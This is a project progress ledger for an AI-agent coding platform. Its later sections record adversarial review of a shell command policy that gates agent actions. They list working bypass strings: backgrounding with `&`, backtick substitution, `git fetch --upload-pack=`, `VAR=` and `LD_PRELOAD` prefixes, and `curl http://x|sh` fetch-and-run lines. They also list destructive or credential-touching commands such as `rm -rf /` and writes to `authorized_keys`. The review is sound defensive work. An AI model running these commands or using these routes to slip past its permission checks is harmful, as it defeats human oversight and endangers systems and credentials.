# PROGRESS — implementation ledger

> Maintained by the orchestrator (docs/technical/14-orchestration-protocol.md). Statuses: TODO · IN_PROGRESS · REVIEW · DONE · BLOCKED. Keep entries short; details go in the WP's notes section below.

## Resume note

- **Current WPs:** three implementers running in parallel worktrees — **WP-04** (event store, critical path),
  **WP-05** (pg-boss jobs port), **WP-02a** (the two command-policy `allow` routes).
- **Last done:** WP-00 (`8852b9e`), WP-01 (`dedc4b9`), WP-03 (`ca1ae06`), WP-02 (`168d368`) — all pushed; CI
  green on WP-00, WP-01, WP-03.
- **Next step:** as each reports, verify in its worktree, review, fix-round, then squash-merge into `main`
  one at a time and re-verify on `main` before committing. WP-04 and WP-05 overlap conceptually (the outbox
  job may need WP-05's scheduler) — reconcile their DISCOVERED notes at merge time.
- **5-WP checkpoint is due when WP-05 lands:** run all four verify targets, `gh run list --limit 5`, fix
  CI forward, and write the M1 milestone note. Also fix the `commitlint`/`dco` CI gap recorded below.
- **Merge recipe that worked for WP-03:** `git merge --squash <branch>`, `pnpm install`, run all four verify
  targets, `git add -A -- . ':!<files held back>'`, commit with the WP message, push. `.claude/worktrees/` is
  now in `.gitignore`.
- **Parallelism note:** the table's `Parallel-safe` column says "no" for WP-02 and WP-03, but the protocol's actual criterion is "different packages, no shared files", which they meet (`packages/domain` vs `packages/infrastructure`, and no dependency between them). Expect a `pnpm-lock.yaml` conflict at merge — resolve by taking one side and re-running `pnpm install`.
- **Session started:** 2026-09-09.
- **Ledger convention:** a WP's commit sha is written into the table by the *following* commit, since the sha is not known while the commit is being made.

## Environment (orchestrator shell, verified 2026-09-09)

| Tool | Version / status |
|---|---|
| OS | macOS (darwin 25.6.0), arm64 |
| git | 2.50.1 · remote `git@github.com:gtfo-ai/platform.git` (ssh), branch `main`, clean |
| gh | 2.86.0 · authenticated as `JanMikes`, scopes `repo, read:org, gist, admin:public_key` — push access OK |
| Node | **25.1.0** on PATH (`/opt/homebrew/bin/node`); Node **24.3.0** at `/opt/homebrew/Cellar/node/24.3.0/bin` — note `/opt/homebrew/opt/node@24` is a **broken symlink** to Cellar/node/25.1.0, corrected at WP-01 |
| pnpm | 12.3.4 (installed globally by the orchestrator during start-up) |
| Docker | server 29.4.1, linux/aarch64 — running |
| gitleaks | **not installed** on the host — must be provided by the repo (npm devDependency or Docker) in WP-00 |
| lefthook | **not installed** on the host — must be an npm devDependency in WP-00 |

**Decision (orchestrator, start-up):** `engines.node` is `>=24` (not `=24`) so the local Node 25 toolchain works; CI pins Node 24 via `.nvmrc`/setup-node. If a dependency breaks on Node 25 locally, prefix commands with `PATH=/opt/homebrew/Cellar/node/24.3.0/bin:$PATH` (verified to run `verify` green at WP-01).

## Blocker briefs needing a human

(none)

## Milestone M1 — the loop

| WP | Title | Depends | Parallel-safe | Status | Commit | Notes |
|---|---|---|---|---|---|---|
| WP-00 | Repo scaffold | — | no | DONE | `8852b9e` | 3 review rounds; notes below |
| WP-01 | `packages/contracts` | WP-00 | no | DONE | `dedc4b9` | APPROVE; 5 hardening fixes folded in |
| WP-02 | `packages/domain` | WP-01 | no | DONE | `168d368` | 3 rounds spent; 2 command-policy defects carried to WP-02a |
| WP-02a | Command policy: close the two `allow` routes found at WP-02 round 3 | WP-02 | no | IN_PROGRESS | — | worktree; **must land before WP-12/WP-15** |
| WP-03 | Postgres schema + Drizzle + migrations (technical/03) | WP-00 | no | DONE | `ca1ae06` | 2 review rounds; 2 privilege escalations found and closed |
| WP-04 | Event store + priority dispatcher + outbox job (TD-005) | WP-02, WP-03 | no | REVIEW | — | worktree; round 2 fixes green |
| WP-05 | Jobs port on pg-boss | WP-03 | no | REVIEW | — | worktree; Q renumber 36→38 at merge |
| WP-06 | Fastify server skeleton (TD-002) | WP-04 | no | TODO | — | |
| WP-07 | Integration ports + fakes + contract test suites | WP-04 | no | TODO | — | |
| WP-08 | Jira Cloud provider | WP-07 | yes | TODO | — | |
| WP-09 | GitLab provider (gitlab.com + self-managed) | WP-07 | yes | TODO | — | |
| WP-10 | Slack provider | WP-07 | yes | TODO | — | |
| WP-11 | Sentry + Loki providers | WP-07 | yes | TODO | — | |
| WP-12 | Claude SDK runner (technical/04) | WP-04, WP-05 | no | TODO | — | |
| WP-13 | Run shim `agentic-runlet` (TD-025) | WP-12 | no | TODO | — | |
| WP-14 | Launcher service + `WorkspaceProvider` (docker + fake) | WP-13 | no | TODO | — | |
| WP-15 | Pipeline interpreter + stage executor + sagas (technical/02) | WP-04…WP-12 | no | TODO | — | |
| WP-16 | Context packs + KB indexer (phase 1 FTS) + code map (ctags + PageRank) | WP-03, WP-12 | no | TODO | — | |
| WP-17 | Role prompts + artifact schemas + eval sets (product/13, TD-016) | WP-12 | yes | TODO | — | |
| WP-18 | Librarian pipeline + proposals + apply policy + knowledge MR flow + ni | WP-16, WP-17 | no | TODO | — | |
| WP-19 | Cost ledger, rollups, budgets projection, price table maintenance job, | WP-04 | no | TODO | — | |
| WP-20 | Web app foundation (TD-013) | WP-06 | yes | TODO | — | |
| WP-21 | Onboarding wizard steps 1–5 incl. discovery agent and readiness evalua | WP-16, WP-17, WP-20 | no | TODO | — | |
| WP-22 | Docker images (base, runtime, launcher, product), Compose (profiles `l | WP-14 | no | TODO | — | |
| WP-23 | Docs | WP-22 | yes | TODO | — | |

## Milestone M2 — trust

| WP | Title | Status | Commit | Notes |
|---|---|---|---|---|
| WP-24 | review-only mode | TODO | — | |
| WP-25 | ticket readiness linter | TODO | — | |
| WP-26 | rebase gate + conflict warnings | TODO | — | |
| WP-27 | steer + take-over/hand-back (export, resume instructions) | TODO | — | |
| WP-28 | cost estimate + budget approval | TODO | — | |
| WP-29 | human time accounting | TODO | — | |
| WP-30 | autonomy dial + wizard step 4 + settings mirror | TODO | — | |
| WP-31 | ask-the-task | TODO | — | |
| WP-32 | digest + quiet hours | TODO | — | |
| WP-33 | nightly real-LLM smoke + evals in CI (`llm-ci` environment). | TODO | — | |

## Milestone M3 — show the value

| WP | Title | Status | Commit | Notes |
|---|---|---|---|---|
| WP-34 | shadow mode (closed tickets) + ShadowReport + UI | TODO | — | |
| WP-35 | history bootstrap | TODO | — | |
| WP-36 | maintenance pipeline | TODO | — | |
| WP-37 | risk classes + reviewer routing (CODEOWNERS) | TODO | — | |
| WP-38 | dependency policy + Checks panel (licence/maintenance status) | TODO | — | |
| WP-39 | coverage delta | TODO | — | |
| WP-40 | epic split (spike variant) | TODO | — | |
| WP-41 | statistics deep-dive (readiness attribution, clean-first-MR rate, estimate accuracy) | TODO | — | |
| WP-42 | release 0.1.0 (release-please, changelog, migration notes). | TODO | — | |

## WP notes (decisions, assumptions, reviewer findings)

### WP-00

**Blocking environment finding — the verification contract's literal command does not parse.**
`pnpm -s verify` fails on pnpm 12 with `error: unexpected argument '-s' found`: pnpm 12's CLI
accepts `-s` only for a real subcommand, and the implicit "run this script" shorthand rejects
preceding global flags. Working equivalents, all implemented and green:
`pnpm run -s verify` · `pnpm -s run verify` · `pnpm verify`.
The same applies to `verify:integration`, `verify:e2e`, `verify:ui`.
`docs/technical/14-orchestration-protocol.md` § "Verification script contract" and the orchestrator
loop should be updated to `pnpm run -s verify` (docs are the orchestrator's to change, not the
implementer's).

Decisions and assumptions:
- **Package scope `@platform/*`** (BD-014). Root package `platform`; nothing carries the product
  name. Renaming later is a scope search-and-replace plus the display constant.
- **No build step yet.** Workspace packages export `./src/index.ts` directly
  (`module: preserve`, `moduleResolution: bundler`, `noEmit: true` everywhere). The emit strategy
  (tsc emit vs bundler) is decided when the first runnable app lands (WP-06). Relative imports are
  written with `.js` extensions because that is what a future `tsc` ESM emit will require —
  nothing enforces it under `moduleResolution: bundler`, and it does *not* make sources runnable
  under Node's type stripping (verified on Node 25.1.0: `import './b.js'` from a `.ts` file throws
  `ERR_MODULE_NOT_FOUND`; stripping needs the on-disk `.ts` specifier).
- **TypeScript 7.0.2** (current stable; 6.x never shipped stable). `strict` plus
  `noUncheckedIndexedAccess`, `noImplicitOverride`, `noFallthroughCasesInSwitch`,
  `noImplicitReturns`, `noUnusedLocals/Parameters`, `verbatimModuleSyntax`.
  `exactOptionalPropertyTypes` deliberately left **off** — it is not part of `strict` and it fights
  zod-inferred types; revisit in WP-01 if contracts tolerate it.
- **Whole-repo typecheck is one program** (`tsconfig.json`), so its `lib` includes DOM. Per-package
  `tsconfig.json` files keep the boundary honest for editors: only `apps/web` gets DOM. Project
  references were left out (the plan marks them optional).
- **Vitest 5 projects** = `unit`, `contract`, `integration`, `e2e-fake-claude`, `ui`; tier chosen by
  file name (`*.contract.test.ts`, `*.integration.test.ts`, `*.e2e.test.ts`, anything under
  `apps/web/src` is `ui`). Coverage thresholds from technical/10 are wired and *proven* to fail when
  breached (80 % overall, 90/85/90 on `packages/domain/src/**`).
- **gitleaks ships as the `@b12k/gitleaks` devDependency** (MIT wrapper, pinned to gitleaks 8.30.1,
  verifies the upstream checksum). `scripts/gitleaks.mjs` falls back to a `gitleaks` on PATH, then to
  `ghcr.io/gitleaks/gitleaks` pinned by digest via Docker, then fails closed (`--require`/`CI`) or
  prints a loud warning. pnpm 12 blocks post-install
  scripts by default: the allowlist lives in `pnpm-workspace.yaml` under `allowBuilds` (not
  `onlyBuiltDependencies`, which pnpm 12 ignores).
- **Hooks call local binaries directly**, not `pnpm exec` — `pnpm exec` triggers an implicit install
  check on every hook run.
- **CI is a single `ci.yml`** with jobs lint · typecheck · unit+contract · ui · integration · e2e ·
  secret-scan · commitlint · dco, as WP-00 asks. Splitting into the separate workflow files listed in
  technical/11 (`integration.yml`, `secrets-scan.yml`, `dco.yml`, `image.yml`, …) is left to the WPs
  that need them. DCO is a plain `git rev-list` + trailer check, so no third-party action to pin.
- **`pnpm dev` and `pnpm schemas` are stubs** that print what they are waiting for and exit 0
  (WP-06/WP-20 and WP-01 respectively).

Evidence:
- `pnpm run -s verify` · `verify:integration` · `verify:e2e` · `verify:ui` — all exit 0, each with a
  single final `PASS: <target>` line; the FAIL path was proven with a deliberate type error.
- Pre-commit hook proven to block: a planted `glpat-…` fake token staged in a throwaway repo using
  this repo's `lefthook.yml` and `.gitleaks.toml` → `leaks found: 2`, hook exit 1. Artefacts deleted;
  `grep` confirms no planted value anywhere in the tree.
- `gitleaks dir .` and `gitleaks git --log-opts=--all` (5 commits) — no leaks.
- `actionlint` (Docker) on `.github/workflows/ci.yml` — 0 errors.

### WP-00 — reviewer round 1 (REQUEST_CHANGES, 2026-09-09)

Blocking:
1. `README.md`, `CONTRIBUTING.md`, `CLAUDE.md`, `.github/PULL_REQUEST_TEMPLATE.md` document `pnpm -s verify`, which pnpm 12.3.4 rejects (`unexpected argument '-s' found`). Must be `pnpm run -s <target>` — the protocol doc was already corrected by the orchestrator.
2. `scripts/gitleaks.mjs` exits 0 when neither a binary nor Docker is available, and that is the only step of the CI `secret-scan` job → a scan that cannot run reports success. Fail-open contradicts BD-002; must fail closed in CI.
3. `CLAUDE.md` claims `.js` extensions keep sources runnable under Node type stripping — false on Node 25 (stripping needs the on-disk `.ts` specifier). Keep the convention, fix the stated reason.

Non-blocking (recorded, fixed opportunistically): `NO_UPDATE_NOTIFIER=1` for `@b12k/gitleaks` (its `update-notifier` chain reads `~/.npmrc` tokens); Docker fallback tag-pinned not digest-pinned and uses the legacy `zricethezav/gitleaks` image instead of `ghcr.io/gitleaks/gitleaks`; `.gitleaks.toml` allowlists `pnpm-lock.yaml` wholesale and exempts any line containing "example"; no import-boundary lint yet (add at WP-01/02 when the first cross-package import lands); `.env.example` omits `APP_FEATURE_*` from technical/12.

### WP-00 — round 2 (implementer response to review round 1)

All three blocking findings and non-blocking 4–7 fixed; the import-boundary lint is deferred as
agreed (no cross-package import exists yet).

1. **Invocation form.** `pnpm run -s <target>` everywhere in `README.md`, `CONTRIBUTING.md`,
   `CLAUDE.md`, `.github/PULL_REQUEST_TEMPLATE.md`; also normalised `pnpm -s run X` → `pnpm run -s X`
   in `.github/workflows/ci.yml` and the `scripts/verify.mjs` header. Tree grep is clean apart from
   `PROGRESS.md`, the protocol doc (both describe the broken form deliberately) and
   **`.claude/agents/{implementer,reviewer}.md`, which still say `pnpm -s verify` on three lines**.
   Those are subagent definitions — harness configuration — so the implementer did not edit them;
   the orchestrator should. Until then every implementer and reviewer is told to run a command that
   errors out.
2. **Secret scan fails closed.** `scripts/gitleaks.mjs` now exits non-zero whenever the scan could
   not run and `--require` was passed or `CI` is set. The pre-commit job and the new
   `secrets:scan:ci` script (used by `ci.yml`) both pass `--require`. `GITLEAKS_SKIP=1` is the only
   way past it locally, it prints a loud banner, and CI ignores it. Manual `pnpm secrets:scan`
   keeps the friendly warn-and-exit-0 behaviour.
3. **`.js` extension rationale corrected** in `CLAUDE.md` and above: it is what a future `tsc` ESM
   emit will require, nothing enforces it under `moduleResolution: bundler`, and it does *not* make
   sources runnable under Node's type stripping.
4. `NO_UPDATE_NOTIFIER: '1'` in every child environment the script spawns (including the probes).
5. Docker fallback is `ghcr.io/gitleaks/gitleaks@sha256:c00b6bd0…bbb7f` (v8.30.1 multi-arch index
   digest), run with `--network=none` and a read-only mount. (Round 2 briefly dropped
   `--network=none` on the false premise that it blocks the pull — the daemon pulls over the host
   network; the flag only affects the container namespace. Restored in round 3.)
6. `.gitleaks.toml`: the blanket `[allowlist] paths` block is **gone entirely** — both scans pass
   without it. The fixture rule's exemption is now the single regex `FAKE`, the marker BD-002
   actually prescribes.
7. `.env.example` gained `APP_FEATURE_TICKET_LINTER|REVIEW_ONLY|MAINTENANCE|SHADOW_MODE|DIGEST`.

Round-2 evidence:
- `pnpm run -s verify` · `verify:integration` · `verify:e2e` · `verify:ui` — all exit 0.
- Fail-closed proof, binary and Docker both unreachable (`PATH=/usr/bin:/bin`, script copied to a
  directory with no `node_modules`): `CI=1` → exit 1; `--require` → exit 1;
  `CI=1 GITLEAKS_SKIP=1 --require` → exit 1 (opt-out ignored in CI);
  `GITLEAKS_SKIP=1 --require` → exit 0 with the banner; no flags → exit 0 with the warning.
- Docker fallback exercised on the pinned digest: planted `glpat-…` → `leaks found: 2`, exit 1;
  clean tree → exit 0.
- Pre-commit re-proven with the final `--require` config: planted secret → exit 1, clean → exit 0.
- `pnpm secrets:scan` and `secrets:scan:ci` (full history) — no leaks. `actionlint` — 0 errors.

### WP-01 — `packages/contracts` (APPROVE, round 1)

Reviewer confirmed doc fidelity: all 49 events in technical/02's catalogue present with exact names and
no inventions; technical/12's config example transcribed key-for-key and parsing; all nine artifact
`data` shapes field-for-field; technical/08 and /04 sampled and matching. `z.strictObject` everywhere —
no `z.object(`, `catchall`, `passthrough`, `any` or `unknown` in the package; every `z.record` is one of
technical/12's user-keyed maps or an opaque provider payload.

**Docs amended by the orchestrator to match the implementation** (the code was right, the docs were
loose): technical/02 line 62 — `actor` lives in the event envelope, not in each payload (matches
`events.actor` in technical/03); technical/12 — `features.shadow_mode` added to the `features:` block.

**Event field renames to remember** (WP-01 chose these over the catalogue's one-line prose):
`ticket.matched.type` → `issue_type`; `task.stage.returned.from`/`to` → `from_stage`/`to_stage`;
`shadow.report.created.comparison` → `artifact`.

**Deferred to later WPs** (reviewer non-blocking, recorded so they are not lost):
- `schemas.ts` mutates `z.globalRegistry` at import and the barrel re-exports it, so every consumer
  inherits ~60 reserved ids; zod 4.5.4's `registry.add` silently overwrites on a duplicate id, and
  `packages/contracts/package.json` declares no `sideEffects`, so the SPA bundles it. Revisit at
  **WP-06** when OpenAPI component naming lands: prefer an exported `registerSchemaIds()`.
- API DTOs are partial — none yet for org stats/audit, project stats, bindings, discovery, kb
  bootstrap/health, task events, shadow reports, or `Idempotency-Key`. The WPs that own those endpoints
  add them.
- `.agentic/pipeline.yml` gate stages accept neither `on` nor `command` — matches the doc's
  `rebase_gate` example but is under-constrained; tighten at **WP-15** (pipeline interpreter).
- `TranscriptEvent` keeps `tool_use_id`/`tool_name` inside content blocks while technical/03 indexes
  them as columns — mapping work for **WP-07**.

Q35 filed in `docs/OPEN-QUESTIONS.md` (technical/12 omits `DiscoveryDraft`'s `data`); recommendation
grounded in product/06 step 2 and implemented.

**Round 2 (hardening, APPROVE).** Five reviewer non-blockers folded in before commit: the `$defs`
collision guard now keys on the canonical definition (the old guard could never fire, so two different
anon defs could merge silently) and moved to an internal `json-schema-defs.ts`; the type-stripping
resolver is scoped to the repo root and outside `node_modules`; the boundary lint denies unknown
packages by default and closes the relative-escape holes; `verify` emits exactly one stdout line per
target (child stdout → fd 2), restoring the protocol's contract; coverage reached 100/100/100/100 over
285 tests. The implementer also found and fixed a real dangling-`$ref` bug that produced
`#/$defs/#/$defs/__schemaN`. `schemas/` regenerates byte-identically.

Residual, all verified unreachable today — fix if the area is touched again:
- an `anon_<hash>` name colliding with a real named `$defs` entry silently clobbers it (one
  `if (!ANONYMOUS_DEF.test(name) && defs[name])` restores the old guard's coverage);
- `stabiliseDefs` rewrites `#/$defs/__schemaN` anywhere in the serialised document, including inside
  `description`/`const`/`enum` strings;
- the Biome `@platform/*` group misses **subpath** specifiers (`@platform/application/src/x.js` passes
  lint; only the `.`-only `exports` maps stop it) and relative escapes to a package root outside `src/`
  (`../../contracts/index.js`);
- any future `verify` step whose stdout must be *captured* will silently land on stderr.

### WP-02 / WP-03 — review round 1 findings (both REQUEST_CHANGES, 2026-09-09)

Both reviewers reproduced their findings by exploit rather than by reading, which is the standard to hold.

**WP-03 (Postgres) — two proven privilege escalations.** (a) Both SECURITY DEFINER functions were created
with PostgreSQL's default `EXECUTE TO PUBLIC`; the `REVOKE ... FROM PUBLIC` lived only inside
`platform_apply_grants`, which never runs when `APP_DB_APP_ROLE=''` — the pgbouncer configuration
`.env.example` itself documents. A role holding only `CONNECT` dropped a `run_messages` partition.
(b) `event_streams` was not registered in `platform_table_policy`, so `platform_app` held UPDATE/DELETE on
the table that substitutes for technical/03's `UNIQUE(stream_type,stream_id,stream_seq)` — deleting a row
and re-inserting produced two events at seq 1, i.e. WP-04 would have inherited a forgeable invariant.
Also fixed this round: partition bounds cast in the caller's TimeZone (a non-UTC session aborts
`platform_ensure_partitions` with "partition would overlap"); `platform_drop_expired_partitions` taking an
unfloored retention window from the caller as a designed bypass of `REVOKE DELETE`; a missing concurrency
test for the seq guard; and `migrator.ts` (240 lines, including the branch that opened finding (a))
excluded from coverage.

**WP-02 (domain) — three command-policy bypasses**, all returning `allow`: `&` missing from the list
operators (`ls & sudo reboot`); backticks not treated as substitution (``ls `rm -rf /` ``); and
prefix-anchored block globs that a moved flag escapes (`git push origin agentic/x --force`), which also
left product/19 §3's "writing outside the workspace" with no pattern at all
(`cat /etc/passwd > /root/.ssh/authorized_keys`). Separately, `resolvedBinary` never blocked anything
because block patterns are command-line globs, so BD-025's "resolved against the real binary" was unmet —
and the test that covered it passed a whole command line as the binary. The block-list property test also
filtered out exactly the metacharacters that break segmentation.

**Docs amended by the orchestrator** (code was right, or the doc had a real gap): technical/02 gains
`run.created` (the `created→starting` transition was silent, contradicting the document's own rule that
every state change is an event); technical/03 gains the `feedback` table (technical/02 and
`contracts/records.ts` both define the aggregate, the data model had no table), a corrected
`runs_active_idx` status list (`queued` is not in the `run_status` enum), and a note that `stage` on
`RunRecord`/`QuestionRecord` must be **nullable** because not every run or question belongs to a pipeline
stage (`task_stage_id` is nullable) — WP-01 typed it non-nullable; WP-04 corrects the contract.

**Scheduled follow-ups (not done in these WPs):** `pipelineLimitsSchema` lacks two of BD-008's six loops
(`refinement_question_rounds`, `architecture_revisions`) — enforced in domain, not configurable; WIP limits
have no schema anywhere. Both belong in `packages/contracts` + technical/12.

**WP-04 must honour (confirmed by exploit at WP-03 round 2):** the `events_enforce_stream_seq()` trigger
is SECURITY DEFINER and its `on conflict do update … returning` takes the `event_streams` row lock itself,
so per-stream appends serialise without the caller doing anything. WP-04 must **not** issue
`SELECT … FOR UPDATE` on `event_streams` — the app role holds SELECT only, and row locks need UPDATE, so
every lock mode returns 42501. A pessimistic aggregate load locks the aggregate's own read_write row
(e.g. `tasks`). The exposed contract is: insert with `stream_seq = last + 1`; a mismatch raises 23505 and
rolls the counter back with the transaction. Also: no past-month partitions are ever created, so WP-04
must not accept caller-supplied past `occurred_at`.

### WP-02 — command policy: three review rounds on one file

`packages/domain/src/policies/command-policy.ts` took three review rounds; everything else in WP-02 was
approved in round 1. Round 1 found three bypasses (`&` missing from list operators, backticks not scanned,
prefix-anchored block globs a moved flag escapes). Round 2's 101 adversarial probes found three more
(process substitution `<(…)`, ANSI-C quoting `$'…'` desyncing the quote state, and a *regression* — the
new token matcher had silently lost the whole-line glob coverage the old scheme had, so `curl * | sh`
stopped matching).

**The lesson, recorded because it generalises:** a hand-rolled shell scanner will never be complete, so
round 3's instruction was to make parse uncertainty **fail closed** rather than to patch three more cases.
`CommandEvaluation.uncertainty` now names what the scanner could not follow, and a non-empty uncertainty
can never evaluate to `allow` — it floors to the fallback and never loosens a `block`. Exactly five
constructs floor to ask: unclosed quote, unterminated command/process substitution, unterminated backtick,
ANSI-C quoting, arithmetic expansion. Nesting is deliberately *not* one of them, because substitution
bodies and wrapped scripts are parsed recursively to the bottom.

Also landed: argv[0] normalisation (basename, leading `VAR=value`, and the wrapper set
`env/command/exec/nohup/time/nice/ionice/xargs/builtin/sh/bash/zsh/dash/eval`), which closed a whole class
of `FOO=1 sudo reboot` / `xargs sudo id` / `/usr/bin/sudo reboot` misses at once; and `DECLINED_BLOCK_VARIANTS`
naming `rm -fr /`, `rm -r -f /`, `git branch --delete --force main` as deliberately unpatterned, with **Q37**
recommending product/19 §3 state the hazard rather than one spelling.

**Orchestrator correction:** I told the implementer to move all of `git rebase*` to ask; that was too broad
and they pushed back correctly. Only `git rebase* -x*` / `--exec*` are hazardous, and WP-26's rebase gate
runs `git rebase` on its happy path — blanket-asking would cost a human approval on every task. Narrowed to
match how `find * -exec*` was already handled.

**Severity frame for anyone reading this later:** this is a *policy* layer. WP-12's `canUseTool` hook and
TD-021's container isolation are the enforcement points. A command that wrongly reads `ask` is a nuisance;
one that wrongly reads `allow` is the defect.

### WP-02a — command policy, two `allow` routes (carried out of WP-02)

**Why this is a separate WP.** WP-02's three review rounds were spent, and the protocol bounds review loops
at three. But round 3 found two *newly discovered* defects rather than repeated failures to fix the same
thing, and blocking WP-02 would have stalled WP-04 and WP-15 — most of M1 — over one file. So WP-02 is
committed and the two defects are tracked here with a fresh review budget.

**Why committing them is safe today, and when it stops being safe.** This is a *policy* layer. The
enforcement points are WP-12's `canUseTool` hook and TD-021's container isolation, neither of which exists
yet: nothing in the repo can execute a shell command at all. The exploits require the runner and workspace
that WP-12/WP-14 build. **WP-02a must therefore land before WP-12**, and certainly before WP-15 wires the
pipeline. It is not optional cleanup.

**Defect 1 — command-runner flags on allow-listed verbs.** `git fetch --upload-pack='<any command>' .`
executes the payload; verified against real git 2.50.1 in a throwaway repo. Every block-list entry runs
under `allow` this way: sudo, docker, kubectl, `rm -rf /`, `terraform apply`, `npm publish`, `curl | sh`.
`rg --pre` and `rg --hostname-bin` are the same class, as are `git fetch --exec`. This is exactly the hazard
that already moved `find * -exec*` and `git rebase* -x*` to ask — the pattern set simply missed these verbs.
Fix: add ask entries at `DEFAULT_IMPLEMENTATION_ASK`.

**Defect 2 — assignment peeling grants `allow` to an unread line.** `stripEnvironmentPrefix` peels leading
`VAR=value` before the allow/ask lists match, so `PATH=/w/bin ls -la` evaluates as plain `ls` and returns
allow — verified executing a fake `ls`. `LD_PRELOAD=…`, `GIT_SSH_COMMAND=… git fetch`,
`GIT_EXTERNAL_DIFF=… git diff` and `GIT_PAGER=… git log` are the same route, and it defeats BD-025's
"resolved against the real binary" in the process. This is the precise reasoning the implementer used for
*not* peeling `sh -c`/`eval`/`xargs` — it was applied to the wrapper half of the peel but not the
assignment half. Fix: keep the peel for the block list only (where it can only tighten), or floor any
assignment-bearing line at ask.

**Also in scope for WP-02a (non-blocking at WP-02):**
- `close + 2` off-by-one at `command-policy.ts:554-555` swallows the character after `$((…))`, so
  `ls $((1))&sudo id` never splits on `&` — ask instead of block. A real desync the uncertainty floor
  cannot catch, because it is not a parse *failure*.
- `git push -f`, `git push origin agentic/x --delete` and refspec form `agentic/foo:main` are not blocked
  though `--force`, `--force-with-lease` and `origin :*` are — spelling gaps, not logic gaps.
- `curl|sh` whitespace sensitivity: `curl http://x|sh`, `| bash`, `| /bin/sh`, `|&` and `wget -O- http://x|sh`
  all reach ask rather than block.
- `git commit --no-verify` is allowed and bypasses this repo's own gitleaks/lefthook pre-commit.
- `evaluateCommand(…, fallback:'allow')` would disarm the uncertainty floor entirely; no caller does that
  today, but nothing prevents one.
- **Q37 must be widened** and its "never allow" claim dropped — it is now demonstrably false.

**What the final review did confirm:** process substitution, ANSI-C quoting, the restored whole-line glob,
the wrapper asymmetry (`env ls` allow, `env nice sudo id` block), the six `git rebase` verdicts, and the
uncertainty floor itself — no path reaches `allow` with non-empty uncertainty. 188 hand-written adversarial
inputs plus 23,760 fuzzed combinations found **no segmentation hole**: every fuzzed `allow` was correct
shell semantics. No ReDoS (50KB input → 8ms). The defects above are missing *patterns* and one peel that
grants trust, not a broken parser.

### WP-05 — the `debounce` that was not a debounce

The review found that the `Jobs` port's `debounce` mode runs its leading job **immediately** (`startAfter`
is now) and its trailing job at the next grid boundary, which can be milliseconds later. technical/02:106
requires the pipeline to debounce `mr.review.comment` for 2 minutes per MR **and then emit one**
`task.stage.returned`; as first shipped, a burst would emit up to two stage-returns with the first instant —
the task would bounce back to Implementation before the human finished commenting. **WP-15's MR batcher must
not use a fixed-grid coalescing primitive for this.** The pattern it needs is a delayed wake-up plus
re-validation on wake: schedule a timer 2 minutes out, and when it fires, re-read whether more comments have
arrived and reschedule if so. TD-004's own "timers re-validate" line is the same idea.

Second finding worth generalising: **the in-memory fake was kinder than pg-boss.** It bucketed the
coalescing slot by `startAfter`, while pg-boss buckets by the database's `now()` (`plans.js:1748`) and
overwrites the caller's `startAfter` with the next slot boundary on a debounce retry. The reviewer found
this by reading pg-boss's source, not the docs. A shared contract suite only protects later WPs if the fake
is *at least as strict* as the real adapter — every WP from here trusts the fake in the unit tier.

**Flake economics, quantified.** The coalescing acceptance test races a 2-second grid boundary across three
awaited round-trips: ~0.2% failure locally, **5-30% on a loaded 2-core runner**. Combined with the WP-02
property-test timeout, the rule for this repo is now explicit: *an assertion that depends on wall-clock
speed is a hardware assertion, not a correctness one.* Use the virtual clock in the contract tier, keep
real-time assertions to "never early", and give anything that must sleep real headroom.

**For WP-06:** `registerPartitionMaintenance` is exported and integration-proven but no `apps/*` composition
root calls it — the daily partition cron WP-03 built will not run until WP-06 wires it. Also note
`defineQueue` is create-if-absent, so changing a queue's policy in code is a silent no-op against a queue
that already exists; a boot-time drift check would catch it.

### WP-02a — what a hand-rolled command policy actually costs

Recorded because the pattern repeated four times and the next person will be tempted to write one of these.

Across WP-02 rounds 1-3 and WP-02a rounds 1-2, six independent adversarial passes found **fifteen** routes
to `allow` in one file. Each pass found defects the previous pass's fixes had not anticipated, and two
passes found that a *fix itself* had silently removed coverage (`curl * | sh` after the token-matcher
rewrite) or reopened an earlier fix (quote-stripping reopened `find . "-exec"`). The parser was never the
problem — 60,000+ fuzzed inputs found no segmentation hole and no ReDoS. The problems were always
**pattern coverage** and **unearned trust**:

- flags that hand an allow-listed verb an arbitrary command (`git fetch --upload-pack=`,
  `git difftool --extcmd=`, `rg --pre`, `git log --ext-diff`), an arbitrary binary, an arbitrary output
  path (`git diff --output=`, GNU `find -fprint`), or an unread remote source (`pip --index-url`);
- prefix globs matching a *different binary* (`ls*` → `lsof`, `git diff*` → `git difftool`,
  `git fetch*` → `git fetch-pack`);
- peeling something off the front of a line and then trusting what remains (`PATH=… ls`);
- quoting and escaping defeating a matcher that never strips quotes.

**The two things that actually worked**, and that any successor to this code should keep: the fail-closed
uncertainty rule (a line the scanner cannot follow can never read `allow`), and *differential* testing —
running the old and new revision side by side over a large corpus and asserting that no verdict loosened.
That second technique caught a regression no amount of new test cases would have: the implementer's own
fuzz found that their `|&` fix had made `|& docker run alpine` a one-stage pipeline which a `length > 1`
guard then dropped, loosening 185 verdicts.

**But differential testing is only as good as the axes you vary, and this is the sharper lesson.** The
implementer reported "0 loosened" across 4,921 hand-built inputs and 240,000 fuzzed ones. The reviewer's
own 179,712-input sweep found **3,624 loosenings** — a family the implementer's generator could not reach
because its quoting axis never varied the *wrapper token*: `"env" ls -la` and `e\nv ls` now peel for the
allow-list because `stripEnvironmentPrefix` tests the dequoted `argv0Name`. Every one of the 3,624 returns
exactly its unquoted twin's verdict, which was already `allow`, so it is an equivalence family and not a
hole. The finding that matters is procedural: **a differential result is evidence about the corpus, not
about the program**, and the person who built the corpus is the worst judge of what it omits. Two
independent corpora disagreed by 3,624 cases here.

**Two corrections that outlived the round** (both from the round-2 reviewer, both recorded in the module doc):

- The `git commit -m "add --output-file"` over-ask is **not** the shell's doing, as the code comment claimed.
  Bash hands git one word, `add --output-file`, and git never sees a flag. It is `tokenise` splitting on
  whitespace with no quote awareness, after which `unquoteToken` strips the orphan quote and what remains
  classifies as a flag. **The right fix is to make `tokenise` quote-aware** — confirmed to remove the false
  positive without weakening any bypass case. Deliberately not done in WP-02a: it is a behaviour change on
  the security path, and the measured false-positive rate is 0.006% (3 of 54,177 real commit subjects).
  **Do it in the next WP that touches this file.**
- Recorded, no action: `git show-ref`, `git diff-tree`, `git diff-index --quiet HEAD` and `git diff-files`
  moved allow→ask as a side effect of scoping the git verbs — read-only and harmless; add explicit allow
  entries if agents start hitting them. `MAX_WRAPPER_DEPTH = 8` means nine or more stacked `nice -n 5`
  wrappers escape token block-matching and land on `ask` rather than `allow` — pre-existing and fail-safe.
